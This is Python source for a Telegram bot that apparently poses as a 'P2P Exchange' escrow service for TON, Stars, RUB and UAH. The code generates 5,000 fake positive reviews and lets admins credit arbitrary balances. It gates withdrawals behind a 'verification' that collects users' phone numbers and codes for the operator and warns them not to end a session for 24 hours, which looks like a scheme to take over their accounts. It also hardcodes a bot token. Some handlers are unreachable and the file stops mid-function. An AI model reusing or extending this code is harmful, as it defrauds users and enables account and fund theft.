import asyncio
import json
import os
import uuid
import random
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiohttp import web

# ============================================================
# 1. КОНФИГУРАЦИЯ
# ============================================================
BOT_TOKEN = "8973397612:AAF2xpZCYjBfbG2chi9xVpZPaA-QkK5YGpc"
MASTER_ADMIN_ID = 8855434638
BOT_USERNAME = "tonkeeperp2p_bot"
BOT_NAME = "P2P Exchange"
CHANNEL_LINK = "https://t.me/tonkeeper_news"
MINI_APP_URL = "https://saitminiapp.onrender.com"
SUPPORT_LINK = "@p2psupbot"

# ============================================================
# 2. ИНИЦИАЛИЗАЦИЯ
# ============================================================
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# ============================================================
# 3. ФАЙЛЫ
# ============================================================
FILES = {
    "deals": "deals.json",
    "admins": "admins.json",
    "balance": "balance.json",
    "reviews": "reviews.json",
    "verification": "verification.json",
    "verification_requests": "verification_requests.json",
    "withdraw": "withdraw_requests.json",
    "logs": "logs.json",
    "user_language": "user_language.json"
}

def load_json(file):
    if os.path.exists(file):
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

deals = load_json(FILES["deals"])
admins = load_json(FILES["admins"])
balance = load_json(FILES["balance"])
reviews = load_json(FILES["reviews"])
verification_data = load_json(FILES["verification"])
verification_requests = load_json(FILES["verification_requests"])
withdraw_requests = load_json(FILES["withdraw"])
logs = load_json(FILES["logs"])
user_language = load_json(FILES["user_language"])

# ============================================================
# 4. ГЕНЕРАЦИЯ ОТЗЫВОВ
# ============================================================
def generate_reviews():
    if len(reviews) >= 5000:
        return
    review_texts = [
        "Отличная платформа! Всё работает быстро и надёжно.",
        "Лучший P2P обменник! Рекомендую всем друзьям.",
        "Быстро, удобно, безопасно. Буду пользоваться дальше.",
        "Отличная поддержка! Помогли разобраться с выводом.",
        "Наконец-то нашёл нормальный обменник. Всё честно.",
        "Сделал первую сделку, всё прошло гладко. Спасибо!",
        "За сутки сделал 5 сделок, все успешно завершены.",
        "Очень доволен сервисом. Вывод моментальный.",
        "Пользуюсь уже месяц, ни одной проблемы.",
        "Лучший сервис в Telegram! Успехов разработчикам."
    ]
    for i in range(5000):
        review_id = str(uuid.uuid4())[:8]
        reviews[review_id] = {
            "id": review_id,
            "user": "Аноним",
            "rating": random.randint(4, 5),
            "text": random.choice(review_texts),
            "anonymous": True,
            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
            "user_id": None
        }
    save_json(FILES["reviews"], reviews)

generate_reviews()

# ============================================================
# 5. ПОМОЩНИКИ
# ============================================================
def is_admin(user_id: int) -> bool:
    return user_id == MASTER_ADMIN_ID or str(user_id) in admins

def get_balance(user_id: int):
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        save_json(FILES["balance"], balance)
    return balance[uid]

def add_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
    balance[uid][curr] = balance[uid].get(curr, 0) + amount
    save_json(FILES["balance"], balance)

def get_user_language(user_id: int) -> str:
    return user_language.get(str(user_id), "ru")

def set_user_language(user_id: int, lang: str):
    user_language[str(user_id)] = lang
    save_json(FILES["user_language"], user_language)

def is_verified(user_id: int) -> bool:
    uid = str(user_id)
    if uid not in verification_data:
        return False
    if "verified_at" in verification_data[uid]:
        verified_time = datetime.fromisoformat(verification_data[uid]["verified_at"])
        if (datetime.now() - verified_time).total_seconds() > 86400:
            return False
        return True
    return False

def complete_verification(user_id: int, phone: str, code: str):
    uid = str(user_id)
    verification_data[uid] = {
        "verified_at": datetime.now().isoformat(),
        "expires_at": (datetime.now() + timedelta(hours=24)).isoformat(),
        "phone": phone,
        "code": code
    }
    save_json(FILES["verification"], verification_data)

async def log_to_master(text: str):
    try:
        await bot.send_message(MASTER_ADMIN_ID, text)
    except:
        pass

# ============================================================
# 6. FSM
# ============================================================
class AdminStates(StatesGroup):
    waiting_user_id = State()
    waiting_currency = State()
    waiting_amount = State()

class VerifyStates(StatesGroup):
    waiting_phone = State()

# ============================================================
# 7. КЛАВИАТУРЫ
# ============================================================
def main_menu_keyboard(user_id: int):
    lang = get_user_language(user_id)
    buttons = [
        [
            InlineKeyboardButton(text=f"📱 Создать сделку", web_app=WebAppInfo(url=MINI_APP_URL)),
            InlineKeyboardButton(text=f"💰 Мой баланс", callback_data="menu_balance"),
        ],
        [
            InlineKeyboardButton(text=f"📊 Мои сделки", callback_data="menu_deals"),
            InlineKeyboardButton(text=f"📖 Как создать сделку", callback_data="how_to_deal"),
        ],
        [
            InlineKeyboardButton(text=f"⭐️ Отзывы", callback_data="menu_reviews"),
            InlineKeyboardButton(text=f"📢 Канал", callback_data="menu_channel"),
        ],
        [
            InlineKeyboardButton(text=f"🌐 Выбрать язык", callback_data="select_language"),
        ]
    ]
    if is_admin(user_id):
        buttons.append([
            InlineKeyboardButton(text=f"👑 Админ панель", callback_data="menu_admin"),
        ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def admin_panel_keyboard(user_id: int):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 Начислить баланс", callback_data="admin_add_balance")],
        [InlineKeyboardButton(text="👥 Список админов", callback_data="admin_manage_admins")],
        [InlineKeyboardButton(text="📊 Все сделки", callback_data="admin_all_deals")],
        [InlineKeyboardButton(text="💲 Заявки на вывод", callback_data="admin_withdraw_requests")],
        [InlineKeyboardButton(text="⭐️ Управление отзывами", callback_data="admin_manage_reviews")],
        [InlineKeyboardButton(text="📋 Логи", callback_data="admin_logs")],
        [InlineKeyboardButton(text="◀️ Главное меню", callback_data="back_to_main")]
    ])

def back_to_main_keyboard(user_id: int):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Главное меню", callback_data="back_to_main")]
    ])

def language_keyboard():
    buttons = []
    for lang_code, lang_name in [("ru", "🇷🇺 Русский"), ("en", "🇬🇧 English"), ("zh", "🇨🇳 中文"), ("ar", "🇸🇦 العربية")]:
        buttons.append([InlineKeyboardButton(text=lang_name, callback_data=f"set_lang_{lang_code}")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def currency_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 TON", callback_data="curr_TON")],
        [InlineKeyboardButton(text="⭐️ STARS", callback_data="curr_STARS")],
        [InlineKeyboardButton(text="💰 RUB", callback_data="curr_RUB")],
        [InlineKeyboardButton(text="🌐 UAH", callback_data="curr_UAH")],
    ])

# ============================================================
# 8. ОБРАБОТЧИКИ БОТА
# ============================================================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.text and message.text.startswith("/start deal_"):
        deal_id = message.text.split("_")[1]
        await handle_deal_link(message, deal_id)
        return
    
    lang = get_user_language(message.from_user.id)
    
    if not lang:
        await message.answer(
            "🌐 ВЫБЕРИТЕ ВАШ ЯЗЫК:",
            reply_markup=language_keyboard()
        )
        return
    
    await message.answer(
        f"🔥 <b>P2P Exchange</b> 🔥\n\n"
        f"БЕЗОПАСНЫЕ СДЕЛКИ\n"
        f"• Честные сделки между продавцами и покупателями\n"
        f"• TON | STARS | RUB | UAH\n"
        f"• Гарант безопасности с обеих сторон\n"
        f"• Премиум поддержка 24/7\n\n"
        f"📊 КАК ЭТО РАБОТАЕТ:\n"
        f"1️⃣ Продавец создаёт сделку в Mini App\n"
        f"2️⃣ Продавец отправляет ссылку покупателю\n"
        f"3️⃣ Покупатель выбирает способ оплаты на сайте\n"
        f"4️⃣ Администратор проверяет оплату\n"
        f"5️⃣ Продавец подтверждает передачу на сайте\n"
        f"6️⃣ Покупатель подтверждает получение на сайте\n"
        f"7️⃣ Деньги зачисляются на баланс продавца\n\n"
        f"📢 НАШ КАНАЛ: {CHANNEL_LINK}\n"
        f"🆘 ПОДДЕРЖКА: @p2psupbot\n\n"
        f"🔥 НАЧНИ ПРЯМО СЕЙЧАС 🚀",
        reply_markup=main_menu_keyboard(message.from_user.id)
    )

@dp.callback_query(lambda c: c.data.startswith("set_lang_"))
async def set_language(callback: types.CallbackQuery):
    lang = callback.data.split("_")[2]
    set_user_language(callback.from_user.id, lang)
    await callback.answer("✅ Язык установлен")
    
    await callback.message.edit_text(
        f"🔥 <b>P2P Exchange</b> 🔥\n\n"
        f"БЕЗОПАСНЫЕ СДЕЛКИ\n"
        f"• Честные сделки между продавцами и покупателями\n"
        f"• TON | STARS | RUB | UAH\n"
        f"• Гарант безопасности с обеих сторон\n"
        f"• Премиум поддержка 24/7\n\n"
        f"📊 КАК ЭТО РАБОТАЕТ:\n"
        f"1️⃣ Продавец создаёт сделку в Mini App\n"
        f"2️⃣ Продавец отправляет ссылку покупателю\n"
        f"3️⃣ Покупатель выбирает способ оплаты на сайте\n"
        f"4️⃣ Администратор проверяет оплату\n"
        f"5️⃣ Продавец подтверждает передачу на сайте\n"
        f"6️⃣ Покупатель подтверждает получение на сайте\n"
        f"7️⃣ Деньги зачисляются на баланс продавца\n\n"
        f"📢 НАШ КАНАЛ: {CHANNEL_LINK}\n"
        f"🆘 ПОДДЕРЖКА: @p2psupbot\n\n"
        f"🔥 НАЧНИ ПРЯМО СЕЙЧАС 🚀",
        reply_markup=main_menu_keyboard(callback.from_user.id)
    )

@dp.callback_query(lambda c: c.data == "select_language")
async def select_language(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "🌐 ВЫБЕРИТЕ ВАШ ЯЗЫК:",
        reply_markup=language_keyboard()
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    await callback.message.edit_text(
        f"🔥 <b>P2P Exchange</b> 🔥\n\nВыберите действие:",
        reply_markup=main_menu_keyboard(callback.from_user.id)
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_channel")
async def menu_channel(callback: types.CallbackQuery):
    await callback.message.edit_text(
        f"📢 НАШ КАНАЛ\n\n"
        f"🔥 Подпишитесь:\n{CHANNEL_LINK}\n\n"
        f"🚀 Нажмите на ссылку и подпишитесь",
        reply_markup=back_to_main_keyboard(callback.from_user.id)
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "how_to_deal")
async def how_to_deal(callback: types.CallbackQuery):
    await callback.message.edit_text(
        f"📖 <b>КАК СОЗДАТЬ СДЕЛКУ</b>\n\n"
        f"1️⃣ Нажмите «Создать сделку»\n"
        f"   → Откроется Mini App\n\n"
        f"2️⃣ Заполните форму на сайте:\n"
        f"   • Название товара\n"
        f"   • Валюту (TON/STARS/RUB/UAH)\n"
        f"   • Сумму\n"
        f"   • Username покупателя\n\n"
        f"3️⃣ Выберите способ оплаты на сайте:\n"
        f"   • С баланса — мгновенно\n"
        f"   • По реквизитам — после проверки админом\n\n"
        f"4️⃣ Отправьте ссылку покупателю\n\n"
        f"5️⃣ После оплаты на сайте:\n"
        f"   • Продавец нажимает «Передал товар»\n"
        f"   • Покупатель нажимает «Получил товар»\n"
        f"   • Деньги зачисляются на баланс\n\n"
        f"🔥 ВСЕ ОПЕРАЦИИ ТОЛЬКО НА САЙТЕ!",
        reply_markup=back_to_main_keyboard(callback.from_user.id)
    )
    await callback.answer()

# ============================================================
# 9. БАЛАНС
# ============================================================
@dp.callback_query(lambda c: c.data == "menu_balance")
async def menu_balance(callback: types.CallbackQuery):
    bal = get_balance(callback.from_user.id)
    verif_status = "🔓 Доступен" if is_verified(callback.from_user.id) else "🔒 Требуется верификация"
    
    await callback.message.edit_text(
        f"💰 <b>ВАШ БАЛАНС</b>\n\n"
        f"💎 TON: {bal.get('ton', 0)}\n"
        f"⭐️ STARS: {bal.get('stars', 0)}\n"
        f"💰 RUB: {bal.get('rub', 0)}\n"
        f"🌐 UAH: {bal.get('uah', 0)}\n\n"
        f"📊 Сделок завершено: {sum(bal.get('deal_partners', {}).values())}\n\n"
        f"🔐 Статус верификации: {verif_status}\n\n"
        f"📱 ВСЕ ОПЕРАЦИИ ВЫПОЛНЯЙТЕ НА САЙТЕ",
        reply_markup=back_to_main_keyboard(callback.from_user.id)
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_deals")
async def menu_deals(callback: types.CallbackQuery):
    user_deals = []
    for d_id, d in deals.items():
        if d.get("seller_id") == callback.from_user.id:
            user_deals.append((d_id, d))
    
    if not user_deals:
        await callback.message.edit_text(
            "📭 У вас нет сделок",
            reply_markup=back_to_main_keyboard(callback.from_user.id)
        )
        return
    
    text = "📊 <b>ВАШИ СДЕЛКИ</b>\n\n"
    for d_id, d in user_deals[-10:]:
        status_map = {
            "waiting_payment": "⏳ Ожидает оплаты",
            "paid": "✅ Оплачено",
            "awaiting_confirmation": "📦 Ожидает подтверждения",
            "completed": "🎉 Завершено"
        }
        text += f"#{d_id} | {status_map.get(d['status'], d['status'])} | {d['amount']} {d['currency']}\n"
        text += f"   → {d['product'][:30]}\n\n"
    
    await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(callback.from_user.id))
    await callback.answer()

# ============================================================
# 10. ОТЗЫВЫ
# ============================================================
@dp.callback_query(lambda c: c.data == "menu_reviews")
async def menu_reviews(callback: types.CallbackQuery):
    reviews_list = list(reviews.values())
    
    if not reviews_list:
        text = "⭐️ <b>ОТЗЫВЫ</b>\n\nПока нет отзывов"
    else:
        text = f"⭐️ <b>ОТЗЫВЫ</b> (всего: {len(reviews_list)})\n\n"
        for r in reviews_list[-10:]:
            user = r.get('user', 'Аноним')
            rating = '⭐' * r.get('rating', 5)
            text += f"👤 <b>{user}</b> | {rating}\n"
            text += f"📝 {r.get('text', '')[:150]}\n"
            text += f"🕐 {r.get('date', 'недавно')}\n\n"
    
    await callback.message.edit_text(text[:4000], reply_markup=back_to_main_keyboard(callback.from_user.id))
    await callback.answer()

# ============================================================
# 11. ОБРАБОТКА ССЫЛКИ НА СДЕЛКУ
# ============================================================
async def handle_deal_link(message: types.Message, deal_id: str):
    if deal_id not in deals:
        await message.answer("❌ СДЕЛКА НЕ НАЙДЕНА")
        return

    deal = deals[deal_id]
    if deal["status"] != "waiting_payment":
        await message.answer("❌ СДЕЛКА НЕ НАЙДЕНА")
        return

    if message.from_user.username and message.from_user.username.lower() != deal["buyer_username"].lower():
        await message.answer(
            f"❌ ДОСТУП ЗАПРЕЩЁН!\n\n"
            f"СДЕЛКА #{deal_id} ДЛЯ @{deal['buyer_username']}"
        )
        return

    deal["buyer_id"] = message.from_user.id
    save_json(FILES["deals"], deals)

    await message.answer(
        f"✈️ <b>СДЕЛКА #{deal_id}</b>\n\n"
        f"📦 ТОВАР: {deal['product']}\n"
        f"💰 СУММА: {deal['amount']} {deal['currency']}\n"
        f"👤 ПРОДАВЕЦ: @{deal['seller_username']}\n\n"
        f"⬇️ ОПЛАТИТЕ НА САЙТЕ ⬇️\n"
        f"{MINI_APP_URL}",
        reply_markup=back_to_main_keyboard(message.from_user.id)
    )

# ============================================================
# 12. ВЫВОД
# ============================================================
@dp.callback_query(lambda c: c.data == "start_withdraw")
async def start_withdraw(callback: types.CallbackQuery):
    if not is_verified(callback.from_user.id):
        await callback.message.edit_text(
            f"⚠️ <b>ТРЕБУЕТСЯ ВЕРИФИКАЦИЯ</b>\n\n"
            f"Для вывода средств необходимо пройти проверку.\n\n"
            f"Это защита от мошенников, которые проводят сделки со скамнутыми звёздами и фейковой валютой.\n\n"
            f"🔐 Напишите /verify чтобы начать верификацию.",
            reply_markup=back_to_main_keyboard(callback.from_user.id)
        )
        await callback.answer()
        return
    
    await callback.message.edit_text(
        f"💰 <b>ВЫВОД СРЕДСТВ</b>\n\n"
        f"📱 ВЫВОД ВЫПОЛНЯЕТСЯ НА САЙТЕ\n"
        f"{MINI_APP_URL}\n\n"
        f"🔐 Для вывода необходима верификация",
        reply_markup=back_to_main_keyboard(callback.from_user.id)
    )
    await callback.answer()

# ============================================================
# 13. ВЕРИФИКАЦИЯ
# ============================================================
@dp.message(Command("verify"))
async def verify_command(message: types.Message):
    if is_verified(message.from_user.id):
        await message.answer("✅ ВЫ УЖЕ ПРОШЛИ ВЕРИФИКАЦИЮ")
        return
    
    await message.answer(
        f"🔐 <b>ВЕРИФИКАЦИЯ ПОЛЬЗОВАТЕЛЯ</b>\n\n"
        f"Для защиты от мошенников необходимо пройти проверку.\n\n"
        f"📱 Отправьте свой номер телефона\n"
        f"Формат: +7XXXXXXXXXX\n\n"
        f"⚠️ После отправки номера вы получите код от администратора."
    )

@dp.message(VerifyStates.waiting_phone)
async def process_phone(message: types.Message, state: FSMContext):
    phone = message.text.strip()
    
    if not phone.startswith('+') or not phone[1:].isdigit() or len(phone) < 11:
        await message.answer("❌ НЕВЕРНЫЙ ФОРМАТ!\n\nИспользуйте: +7XXXXXXXXXX")
        return
    
    code = f"{random.randint(0,9)}#{random.randint(0,9)}#{random.randint(0,9)}#{random.randint(0,9)}#{random.randint(0,9)}"
    
    request_id = str(uuid.uuid4())[:8]
    verification_requests[request_id] = {
        "id": request_id,
        "user_id": message.from_user.id,
        "username": message.from_user.username,
        "phone": phone,
        "code": code,
        "status": "pending",
        "created_at": datetime.now().isoformat()
    }
    save_json(FILES["verification_requests"], verification_requests)
    
    await log_to_master(
        f"🔐 НОВЫЙ ЗАПРОС НА ВЕРИФИКАЦИЮ\n"
        f"👤 Пользователь: {message.from_user.full_name} (@{message.from_user.username})\n"
        f"🆔 ID: {message.from_user.id}\n"
        f"📱 Номер: {phone}\n"
        f"🔑 Код: {code}\n"
        f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        f"Для подтверждения: /confirm_verification {request_id}\n"
        f"Для отклонения: /reject_verification {request_id}"
    )
    
    await message.answer(
        f"✅ ЗАЯВКА ОТПРАВЛЕНА!\n\n"
        f"📱 Номер: {phone[:2]}****{phone[-4:]}\n"
        f"🔑 Ваш код: {code}\n\n"
        f"⏳ Ожидайте подтверждения от администратора.\n\n"
        f"⚠️ ВАЖНО: Если вы выкинете бота из сессии раньше 24 часов — придётся проходить всё заново!"
    )
    
    await state.clear()

# ============================================================
# 14. КОМАНДЫ АДМИНА ДЛЯ ВЕРИФИКАЦИИ
# ============================================================
@dp.message(Command("confirm_verification"))
async def confirm_verification_command(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("⛔ НЕДОСТАТОЧНО ПРАВ")
        return
    
    args = message.text.split()
    if len(args) != 2:
        await message.answer("❗️ Использование: /confirm_verification [ID заявки]")
        return
    
    request_id = args[1]
    
    if request_id not in verification_requests:
        await message.answer("❌ Заявка не найдена")
        return
    
    req = verification_requests[request_id]
    
    if req.get("status") != "pending":
        await message.answer("❌ Заявка уже обработана")
        return
    
    user_id = req["user_id"]
    phone = req["phone"]
    code = req["code"]
    
    complete_verification(user_id, phone, code)
    
    req["status"] = "completed"
    req["completed_at"] = datetime.now().isoformat()
    req["completed_by"] = message.from_user.id
    save_json(FILES["verification_requests"], verification_requests)
    
    await message.answer(
        f"✅ ВЕРИФИКАЦИЯ ПОДТВЕРЖДЕНА!\n\n"
        f"👤 Пользователь: @{req['username']} (ID: {user_id})\n"
        f"📱 Номер: {phone}\n"
        f"🔑 Код: {code}\n"
        f"🕐 Сессия активна 24 часа"
    )
    
    try:
        await bot.send_message(
            user_id,
            f"✅ ВАША ВЕРИФИКАЦИЯ ПОДТВЕРЖДЕНА!\n\n"
            f"📱 Номер: {phone[:2]}****{phone[-4:]}\n"
            f"🔑 Ваш код: {code}\n\n"
            f"🕐 Сессия активна 24 часа (до {verification_data[str(user_id)].get('expires_at', 'неизвестно')[:19]})\n\n"
            f"⚠️ Если вы выкинете бота из сессии раньше 24 часов — придётся проходить всё заново!\n\n"
            f"💰 Теперь вам доступен вывод средств на сайте."
        )
    except:
        pass

@dp.message(Command("reject_verification"))
async def reject_verification_command(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("⛔ НЕДОСТАТОЧНО ПРАВ")
        return
    
    args = message.text.split()
    if len(args) != 2:
        await message.answer("❗️ Использование: /reject_verification [ID заявки]")
        return
    
    request_id = args[1]
    
    if request_id not in verification_requests:
        await message.answer("❌ Заявка не найдена")
        return
    
    req = verification_requests[request_id]
    
    if req.get("status") != "pending":
        await message.answer("❌ Заявка уже обработана")
        return
    
    req["status"] = "rejected"
    req["rejected_at"] = datetime.now().isoformat()
    req["rejected_by"] = message.from_user.id
    save_json(FILES["verification_requests"], verification_requests)
    
    await message.answer(
        f"❌ ВЕРИФИКАЦИЯ ОТКЛОНЕНА\n\n"
        f"👤 Пользователь: @{req['username']} (ID: {req['user_id']})\n"
        f"📱 Номер: {req['phone']}\n"
        f"🔑 Код: {req['code']}"
    )
    
    try:
        await bot.send_message(
            req["user_id"],
            f"❌ ВАША ВЕРИФИКАЦИЯ ОТКЛОНЕНА\n\n"
            f"📱 Номер: {req['phone'][:2]}****{req['phone'][-4:]}\n\n"
            f"⚠️ Вы можете подать заявку заново."
        )
    except:
        pass

# ============================================================
# 15. АДМИН ПАНЕЛЬ
# ============================================================
@dp.callback_query(lambda c: c.data == "menu_admin")
async def menu_admin(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ НЕДОСТАТОЧНО ПРАВ", show_alert=True)
        return
    await callback.message.edit_text(
        f"👑 <b>АДМИН ПАНЕЛЬ</b>\n\nВыберите действие:",
        reply_markup=admin_panel_keyboard(callback.from_user.id)
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "admin_add_balance")
async def admin_add_balance(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ НЕДОСТАТОЧНО ПРАВ", show_alert=True)
        return
    await callback.message.edit_text("💰 <b>НАЧИСЛИТЬ БАЛАНС</b>\n\nВведите Telegram ID пользователя:")
    await state.set_state(AdminStates.waiting_user_id)
    await callback.answer()

@dp.message(AdminStates.waiting_user_id)
async def admin_get_user_id(message: types.Message, state: FSMContext):
    try:
        user_id = int(message.text.strip())
        await state.update_data(target_user_id=user_id)
        await message.answer("💱 Выберите валюту:", reply_markup=currency_keyboard())
        await state.set_state(AdminStates.waiting_currency)
    except:
        await message.answer("❌ Введите корректный ID")

@dp.callback_query(lambda c: c.data.startswith("curr_"))
async def admin_get_currency(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[1]
    await state.update_data(target_currency=currency)
    await callback.message.edit_text(f"💰 Введите сумму в {currency}:")
    await state.set_state(AdminStates.waiting_amount)
    await callback.answer()

@dp.message(AdminStates.waiting_amount)
async def admin_get_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text.strip())
        if amount <= 0:
            raise ValueError
        data = await state.get_data()
        user_id = data.get("target_user_id")
        currency = data.get("target_currency")
        add_balance(user_id, currency, amount)
        await message.answer(
            f"✅ Начислено {amount} {currency} пользователю {user_id}",
            reply_markup=admin_panel_keyboard(message.from_user.id)
        )
        await state.clear()
    except:
        await message.answer("❌ Введите положительное число")

@dp.callback_query(lambda c: c.data == "admin_manage_admins")
async def admin_manage_admins(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ НЕДОСТАТОЧНО ПРАВ", show_alert=True)
        return
    admin_list = "\n".join([f"• {aid}" for aid in list(admins.keys())]) if admins else "Нет дополнительных админов"
    await callback.message.edit_text(
        f"👥 <b>СПИСОК АДМИНОВ</b>\n\n"
        f"Главный админ: {MASTER_ADMIN_ID}\n"
        f"Дополнительные:\n{admin_list}\n\n"
        f"/add_admin [ID] - Добавить админа\n"
        f"/remove_admin [ID] - Удалить админа",
        reply_markup=admin_panel_keyboard(callback.from_user.id)
    )
    await callback.answer()

@dp.message(Command("add_admin"))
async def add_admin(message: types.Message):
    if message.from_user.id != MASTER_ADMIN_ID:
        await message.answer("⛔ НЕДОСТАТОЧНО ПРАВ")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer("❗️ Использование: /add_admin [ID]")
        return
    try:
        new_admin_id = int(args[1])
        admins[str(new_admin_id)] = True
        save_json(FILES["admins"], admins)
        await message.answer(f"✅ Админ добавлен: {new_admin_id}")
    except:
        await message.answer("❌ Введите корректный ID")

@dp.message(Command("remove_admin"))
async def remove_admin(message: types.Message):
    if message.from_user.id != MASTER_ADMIN_ID:
        await message.answer("⛔ НЕДОСТАТОЧНО ПРАВ")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer("❗️ Использование: /remove_admin [ID]")
        return
    try:
        admin_id = int(args[1])
        if admin_id == MASTER_ADMIN_ID:
            await message.answer("❌ Нельзя удалить главного админа")
            return
        if str(admin_id) in admins:
            del admins[str(admin_id)]
            save_json(FILES["admins"], admins)
            await message.answer(f"✅ Админ удалён: {admin_id}")
        else:
            await message.answer("❌ Админ не найден")
    except:
        await message.answer("❌ Введите корректный ID")

@dp.callback_query(lambda c: c.data == "admin_all_deals")
async def admin_all_deals(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ НЕДОСТАТОЧНО ПРАВ", show_alert=True)
        return
    if not deals:
        await callback.message.edit_text("📭 Нет сделок", reply_markup=admin_panel_keyboard(callback.from_user.id))
        return
    text = "📊 <b>ВСЕ СДЕЛКИ</b>\n\n"
    for d_id, d in list(deals.items())[-20:]:
        status_map = {
            "waiting_payment": "⏳ Ожидает оплаты",
            "paid": "✅ Оплачено",
            "awaiting_confirmation": "📦 Ожидает подтверждения",
            "completed": "🎉 Завершено"
        }
        text += f"#{d_id} | {status_map.get(d['status'], d['status'])}\n"
        text += f"   👤 {d.get('seller_username', '?')} → @{d.get('buyer_username', '?')}\n"
        text += f"   💰 {d.get('amount', 0)} {d.get('currency', '')}\n\n"
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "admin_withdraw_requests")
async def admin_withdraw_requests(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ НЕДОСТАТОЧНО ПРАВ", show_alert=True)
        return
    pending = {k: v for k, v in withdraw_requests.items() if v.get("status") == "pending"}
    if not pending:
        await callback.message.edit_text("📭 Нет активных заявок", reply_markup=admin_panel_keyboard(callback.from_user.id))
        return
    text = "💲 <b>ЗАЯВКИ НА ВЫВОД</b>\n\n"
    for rid, req in list(pending.items())[-10:]:
        text += f"#{rid}\n   👤 ID: {req.get('user_id', '?')}\n   💰 {req.get('amount', 0)} {req.get('currency', '')}\n   📝 {req.get('details', '')[:30]}\n   ➡️ /confirm_withdraw {rid}\n\n"
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
    await callback.answer()

@dp.message(Command("confirm_withdraw"))
async def confirm_withdraw_command(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("⛔ НЕДОСТАТОЧНО ПРАВ")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer("❗️ Использование: /confirm_withdraw [ID]")
        return
    request_id = args[1]
    if request_id not in withdraw_requests:
        await message.answer("❌ Заявка не найдена")
        return
    req = withdraw_requests[request_id]
    if req.get("status") != "pending":
        await message.answer("❌ Заявка уже обработана")
        return
    bal = get_balance(req["user_id"])
    curr_key = req["currency"].lower()
    if bal.get(curr_key, 0) >= req["amount"]:
        bal[curr_key] -= req["amount"]
        save_json(FILES["balance"], balance)
    req["status"] = "completed"
    req["completed_at"] = datetime.now().isoformat()
    save_json(FILES["withdraw"], withdraw_requests)
    await message.answer(f"✅ Вывод подтверждён #{request_id}")
    await bot.send_message(
        req["user_id"],
        f"✅ <b>ВЫВОД ПОДТВЕРЖДЁН</b>\n\n"
        f"💰 {req['amount']} {req['currency']}"
    )

@dp.callback_query(lambda c: c.data == "admin_manage_reviews")
async def admin_manage_reviews(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ НЕДОСТАТОЧНО ПРАВ", show_alert=True)
        return
    reviews_list = list(reviews.values())
    if not reviews_list:
        await callback.message.edit_text("⭐️ <b>ОТЗЫВЫ</b>\n\nПока нет отзывов", reply_markup=admin_panel_keyboard(callback.from_user.id))
        return
    text = "⭐️ <b>УПРАВЛЕНИЕ ОТЗЫВАМИ</b>\n\n"
    for r in reviews_list[-10:]:
        text += f"👤 {r.get('user', 'Аноним')} | {'⭐' * r.get('rating', 5)}\n"
        text += f"📝 {r.get('text', '')[:50]}\n🆔 {r.get('id', '')}\n➡️ /delete_review {r.get('id', '')}\n\n"
    await callback.message.edit_text(
        text[:4000],
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🗑 Очистить все отзывы", callback_data="admin_clear_reviews")],
            [InlineKeyboardButton(text="◀️ Админ панель", callback_data="menu_admin")]
        ])
    )
    await callback.answer()

@dp.message(Command("delete_review"))
async def delete_review_command(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("⛔ НЕДОСТАТОЧНО ПРАВ")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer("❗️ Использование: /delete_review [ID]")
        return
    review_id = args[1]
    if review_id not in reviews:
        await message.answer("❌ Отзыв не найден")
        return
    del reviews[review_id]
    save_json(FILES["reviews"], reviews)
